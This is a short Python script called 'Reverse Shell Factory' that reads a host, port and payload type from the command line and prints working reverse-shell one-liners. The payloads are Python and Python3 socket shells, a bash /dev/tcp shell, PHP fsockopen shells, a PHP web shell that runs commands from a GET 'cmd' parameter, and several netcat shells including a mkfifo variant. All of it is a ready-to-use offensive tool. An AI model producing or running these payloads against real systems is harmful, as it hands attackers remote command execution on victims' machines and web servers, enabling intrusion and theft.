#! /usr/bin/python3
# by farinap5 <3
import sys

def pay(host,port,load):
    if load == "py":
        print("""
Simple Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        """.format(host,port))
    if load == "py3":
        print("""
Simple Python3

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        """.format(host,port))

    if load == "bash":
        print("""
Simple Bash

bash -i >& /dev/tcp/{}/{} 0>&1
        """.format(host,port))

    if load == "php":
        print("""
Simpel PHP

php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
        """.format(host, port))
    if load == "php2":
        print("""
Simple PHP 

php -r '$s=fsockopen("{}",{});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
        """.format(host, port))
    if load == "phpw":
        print("""
PHP to be inserted into Web Pages

exec("/bin/bash -c 'bash -i > /dev/tcp/{}/{} 0>&1'")
        """.format(host,port))
    if load == "phpw2":
        print("""
PHP Web
<?php echo(system($_GET["cmd"]))?>
        """)

    if load == "nc":
        print("""
NetCat Reverse Shell

nc -c /bin/bash {} {}\n 
nc -e /bin/bash {} {}\n
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f
        """.format(host,port,host,port,host,port))


def help():
    print("""
    ------Help Menu------
    Reverse Shell Factory
    v.1
    
    Usage Method:
    python3 rsfac.py <args>
    
    Example:
    python3 rsfac.py l=py h=192.168.1.10 p=4444
    
    
    -Commands-----------
    h=        Local Host
    p=        Local Port
    l=           Payload
    help       Help Menu
    
    
    -Reverse Shell Payloads------
    py              Simple Python
    py3            Simple Python3
    bash              Simple Bash
    php                Simple PHP
    php2       Second Type of PHP
    phpw     Shell For Web Server
    phpw2   Simple For Web Server
    nc          Some Types Netcat
    """)

args = sys.argv[1:]

#print(args[0],args[1],args[2])
for arg in args:
    if "help" in arg:
        help()
        exit()
    if arg[:2] == "p=":
        port = arg[2:]
    if arg[:2] == "h=":
        host = arg[2:]
    if arg[:2] == "l=":
        load = arg[2:]

print("Reverse Shell Factory\n")
try:
    print("Local Host:",host)
    print("Local Port:",port)
    print("Type:",load)
except:
    pass
try:
    pay(host,port,load)
except:
    print("Sintax Error")
